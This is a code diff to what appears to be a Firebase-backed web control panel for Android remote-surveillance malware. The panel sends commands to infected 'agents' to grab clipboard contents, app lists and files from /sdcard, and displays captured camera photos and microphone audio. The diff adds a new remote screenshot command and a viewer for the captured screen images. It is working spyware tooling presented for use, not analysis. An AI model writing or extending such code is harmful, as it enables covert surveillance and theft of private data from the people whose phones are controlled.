@@ -169,6 +169,7 @@ db.ref('agents').on('value', snap => {
       '<button data-c="battery" class="flat">Battery</button>' +
       '<button data-c="app_list" class="flat">Apps</button>' +
       '<button data-c="clipboard" class="flat">Clipboard</button>' +
+      '<button data-c="screenshot" class="flat">Screen</button>' +
       '<button data-c="list_files" data-arg="/sdcard">List /sdcard</button>' +
       '<input type="text" id="path_'+id+'" placeholder="/sdcard/Download/file.jpg"/>' +
       '<button data-c="list_files" class="flat" data-arg="#path">Path</button>' +
@@ -234,6 +235,12 @@ function previewPayload(payload) {
   if (d.body && d.facing) {
     mem.innerHTML = '<p style="color:#7fff7f">'+ d.facing +' shot, '+d.size+' bytes base64</p>'+
       '<img src="data:image/jpeg;base64,'+d.body+'" style="max-width:320px;max-height:320px;border:1px solid #2a2a2a"/>';
+    return;
+  }
+  // screenshot
+  if (d.body && d.w && d.h) {
+    mem.innerHTML = '<p style="color:#ffff7f">screen capture '+d.w+'x'+d.h+'</p>'+
+      '<img src="data:image/jpeg;base64,'+d.body+'" style="max-width:420px;max-height:320px;border:1px solid #2a2a2a"/>';
     return;
   }
   // mic audio
